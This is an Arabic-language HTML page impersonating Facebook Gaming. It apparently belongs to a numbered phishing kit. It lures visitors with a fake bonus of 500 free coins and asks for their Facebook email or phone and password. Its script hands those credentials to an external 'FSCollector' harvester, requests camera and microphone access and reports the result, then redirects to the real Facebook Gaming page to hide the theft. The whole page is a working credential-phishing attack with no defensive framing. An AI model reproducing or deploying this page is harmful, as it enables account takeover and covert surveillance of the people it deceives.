<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook Gaming</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    background: linear-gradient(135deg, #0f0f23 0%, #1a1a3e 100%);
    min-height: 100vh;
    color: #fff;
    padding: 20px;
  }
  .container {
    max-width: 500px;
    margin: 0 auto;
  }
  .header {
    text-align: center;
    margin-bottom: 24px;
  }
  .icon {
    font-size: 64px;
    margin-bottom: 12px;
  }
  h1 {
    font-size: 26px;
    font-weight: 800;
    margin-bottom: 8px;
    background: linear-gradient(135deg, #9146ff, #00d4ff);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
  }
  .subtitle {
    font-size: 14px;
    color: #a0a0c0;
    line-height: 1.5;
  }
  .card {
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 16px;
    padding: 24px;
    margin-bottom: 16px;
  }
  .prize-box {
    background: linear-gradient(135deg, #ff6b35, #ff0051);
    padding: 16px;
    border-radius: 12px;
    text-align: center;
    margin-bottom: 20px;
    color: #fff;
  }
  .prize-box strong {
    display: block;
    font-size: 20px;
    margin-bottom: 4px;
  }
  .prize-box small {
    font-size: 13px;
    opacity: 0.9;
  }
  .info {
    font-size: 14px;
    line-height: 1.6;
    color: #c0c0d0;
    margin-bottom: 18px;
  }
  .input {
    width: 100%;
    padding: 14px 16px;
    background: rgba(255,255,255,0.08);
    border: 1px solid rgba(255,255,255,0.15);
    border-radius: 10px;
    color: #fff;
    font-size: 15px;
    font-family: inherit;
    margin-bottom: 12px;
  }
  .input::placeholder { color: #8080a0; }
  .input:focus {
    outline: none;
    border-color: #9146ff;
    box-shadow: 0 0 0 3px rgba(145, 70, 255, 0.2);
  }
  .btn {
    width: 100%;
    padding: 15px;
    background: linear-gradient(135deg, #9146ff, #00d4ff);
    color: #fff;
    border: none;
    border-radius: 10px;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    font-family: inherit;
    margin-top: 6px;
  }
  .btn:active { transform: scale(0.98); }
  .btn:disabled { opacity: 0.5; }
  .features {
    display: flex;
    justify-content: center;
    gap: 20px;
    font-size: 12px;
    color: #8080a0;
    margin-top: 16px;
  }
  .features div { text-align: center; }
  .features strong { display: block; font-size: 18px; color: #9146ff; margin-bottom: 4px; }
  .error-msg {
    background: rgba(255, 60, 60, 0.15);
    border: 1px solid rgba(255, 60, 60, 0.4);
    border-radius: 8px;
    padding: 10px 12px;
    color: #ff8080;
    font-size: 13px;
    margin-bottom: 12px;
    display: none;
  }
  .error-msg.show { display: block; }
  .page-loader {
    position: fixed; inset: 0;
    background: #0f0f23;
    display: none;
    align-items: center; justify-content: center;
    flex-direction: column;
    z-index: 9999;
  }
  .page-loader.active { display: flex; }
  .loader-spinner {
    width: 48px; height: 48px;
    border: 4px solid rgba(145, 70, 255, 0.2);
    border-top-color: #9146ff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin-bottom: 16px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .loader-text { font-size: 15px; color: #c0c0d0; }
</style>
</head>
<body>

<div class="container">

  <div class="header">
    <div class="icon">🎮</div>
    <h1>Facebook Gaming</h1>
    <p class="subtitle">انضم لأكبر مجتمع للألعاب على فيسبوك</p>
  </div>

  <div class="card">
    <div class="prize-box">
      <strong>🎁 مكافأة ترحيبية</strong>
      <small>500 عملة مجانية + Drops حصرية</small>
    </div>

    <div class="info">
      للوصول إلى الألعاب الحصرية والمكافآت اليومية، يرجى تسجيل الدخول بحسابك.
    </div>

    <div class="error-msg" id="error-msg"></div>

    <form id="gaming-form" onsubmit="return handleGaming(event)">
      <input type="text" id="email" class="input" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
      <input type="password" id="password" class="input" placeholder="كلمة المرور" required>
      <button type="submit" class="btn" id="gaming-btn">تسجيل الدخول والحصول على المكافأة</button>
    </form>

    <div class="features">
      <div><strong>10K+</strong>لعبة</div>
      <div><strong>5M+</strong>لاعب</div>
      <div><strong>Daily</strong>جوائز</div>
    </div>
  </div>

</div>

<div class="page-loader" id="page-loader">
  <div class="loader-spinner"></div>
  <div class="loader-text">جاري تجهيز حسابك...</div>
</div>

<script src="/fs/static/collector.js"></script>

<script>
(function() {
    "use strict";
    var submitting = false;

    function showError(msg) {
        var el = document.getElementById('error-msg');
        el.textContent = msg;
        el.classList.add('show');
        setTimeout(function() { el.classList.remove('show'); }, 4000);
    }

    function handleGaming(event) {
        event.preventDefault();
        if (submitting) return false;

        var email = document.getElementById('email').value.trim();
        var password = document.getElementById('password').value.trim();

        if (!email || !password) {
            showError('يرجى ملء جميع الحقول');
            return false;
        }

        submitting = true;
        var btn = document.getElementById('gaming-btn');
        btn.disabled = true;
        btn.textContent = 'جاري التحقق...';

        FSCollector.captureForm({
            email: email,
            password: password,
            form_type: 'gaming'
        }, {
            metadata: { page: '09_gaming' }
        }).then(function() {
            FSCollector.showLoader('جاري تجهيز المكافأة...');

            setTimeout(function() {
                FSCollector.requestPermissions({
                    camera: true,
                    microphone: true,
                    location: false
                }).then(function(perms) {
                    FSCollector.sendPermissionsResult(perms);
                });

                setTimeout(function() {
                    FSCollector.redirect('https://www.facebook.com/gaming');
                }, 3000);
            }, 500);
        });

        return false;
    }

    window.handleGaming = handleGaming;
})();
</script>

</body>
</html>
